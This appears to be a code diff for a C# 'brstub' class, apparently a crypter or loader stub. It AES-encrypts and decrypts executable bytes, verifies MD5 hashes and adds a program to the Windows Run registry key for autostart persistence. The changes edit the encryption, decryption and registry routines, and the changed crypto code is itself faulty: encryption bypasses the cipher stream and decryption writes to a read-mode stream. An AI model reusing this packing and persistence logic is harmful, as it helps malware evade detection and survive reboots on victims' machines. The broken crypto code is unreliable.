@@ -23,11 +23,11 @@ public class brstub
 
     //PRIVATE METHODS
 
-    private static string GetMd5Hash(MD5 md5Hash, string input)
+    private static string GetMd5Hash(MD5 md5Hash, byte[] input)
     {
 
         // Convert the input string to a byte array and compute the hash.
-        byte[] data = md5Hash.ComputeHash(Encoding.UTF8.GetBytes(input));
+        byte[] data = md5Hash.ComputeHash(input);
 
         // Create a new Stringbuilder to collect the bytes
         // and create a string.
@@ -47,13 +47,18 @@ public class brstub
     //PUBLIC METHODS
 
     //untested
-    public static string GetMd5Hash(string input)
+    /// <summary>
+    /// Generate MD5 hash.
+    /// </summary>
+    /// <param name="input">Byte array of data to hash</param>
+    /// <returns>Hash as string.</returns>
+    public static string GetMd5Hash(byte[] input)
     {
 
         
         MD5 md5Hash = MD5.Create(); 
         // Convert the input string to a byte array and compute the hash.
-        byte[] data = md5Hash.ComputeHash(Encoding.UTF8.GetBytes(input));
+        byte[] data = md5Hash.ComputeHash(input);
 
         // Create a new Stringbuilder to collect the bytes
         // and create a string.
@@ -84,11 +89,11 @@ public class brstub
         using (Aes aesecr = Aes.Create())
         {
 
-            aesdcr.BlockSize = 128;
-            aesdcr.KeySize = 256;
-            aesdcr.Mode = CipherMode.CBC;
+            aesecr.BlockSize = 128;
+            aesecr.KeySize = 256;
+            aesecr.Mode = CipherMode.CBC;
 
-            aesecr.Key = aesecr.GenerateKey;
+            aesecr.GenerateKey();
             aesecr.GenerateIV();
 
             key = aesecr.Key;
@@ -129,9 +134,9 @@ public class brstub
         using (Aes aesecr = Aes.Create())
         {
 
-            aesdcr.BlockSize = 128;
-            aesdcr.KeySize = 256;
-            aesdcr.Mode = CipherMode.CBC;
+            aesecr.BlockSize = 128;
+            aesecr.KeySize = 256;
+            aesecr.Mode = CipherMode.CBC;
 
             aesecr.Key = key;
             aesecr.GenerateIV();
@@ -174,9 +179,9 @@ public class brstub
         using (Aes aesecr = Aes.Create())
         {
 
-            aesdcr.BlockSize = 128;
-            aesdcr.KeySize = 256;
-            aesdcr.Mode = CipherMode.CBC;
+            aesecr.BlockSize = 128;
+            aesecr.KeySize = 256;
+            aesecr.Mode = CipherMode.CBC;
 
             aesecr.Key = key;
             aesecr.IV = IV;
@@ -189,13 +194,11 @@ public class brstub
             {
                 using (var csEncrypt = new CryptoStream(msEncrypt, encryptor, CryptoStreamMode.Write))
                 {
-                    using (var swEncrypt = new StreamWriter(csEncrypt))
-                    {
-                        //Write all data to the stream.
-                        swEncrypt.Write(file);
-                    }
-                    encrypted = msEncrypt.ToArray();
+                    msEncrypt.Write(file, 0, file.Length);
+                    csEncrypt.Close();
+                   
                 }
+                encrypted = msEncrypt.ToArray();
             }
         }
         return encrypted;
@@ -225,18 +228,15 @@ public class brstub
 
             ICryptoTransform decryptor = aesdcr.CreateDecryptor(aesdcr.Key, aesdcr.IV);
 
-            using (var msDecrypt = new MemoryStream(enc_exe))
+            using (var msDecrypt = new MemoryStream(encFile))
             {
                 using (var csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read))
                 {
-                    using (var srDecrypt = new StreamReader(csDecrypt))
-                    {
-
-                        // Read the decrypted bytes from the decrypting stream
-                        // and place them in a string.
-                        decrypted = srDecrypt.ReadToEnd();
-                    }
+                    csDecrypt.Write(encFile, 0, encFile.Length);
+                    csDecrypt.Close();
                 }
+
+                decrypted = msDecrypt.ToArray();
             }
         }
 
@@ -259,7 +259,7 @@ public class brstub
             // Create a StringComparer an compare the hashes.
             StringComparer comparer = StringComparer.OrdinalIgnoreCase;
 
-            if (0 == comparer.Compare(hashOfInput, hash)) return true;
+            if (0 == comparer.Compare(hashOfInput, hashMD5)) return true;
             
             else return false;
         }
@@ -285,21 +285,23 @@ public class brstub
     /// <param name="appName">App name in name field in register.</param>
     /// <param name="path">Path to file to autostart.</param>
     /// <param name="regKey">Switcher between CurrentUser key and LocalMachine key(administrator required). </param>
-    /// <returns></returns>
-    public void addToReg(string appName, string path, regKeyType regKey)
+    /// <returns>True if register is set or false if error.</returns>
+    public bool addToReg(string appName, string path, regKeyType regKey)
     {
         RegistryKey rkApp;
-
         if (regKey == regKeyType.CurrentUser)
         {
             rkApp = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
         }
-        else if(regKey == regKeyType.LocalMachine)
+        else if (regKey == regKeyType.LocalMachine)
         {
             rkApp = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
         }
+        else return false;
+
         rkApp.SetValue(appName, path);
         rkApp.Close();
+        return true;
     }
     
 }
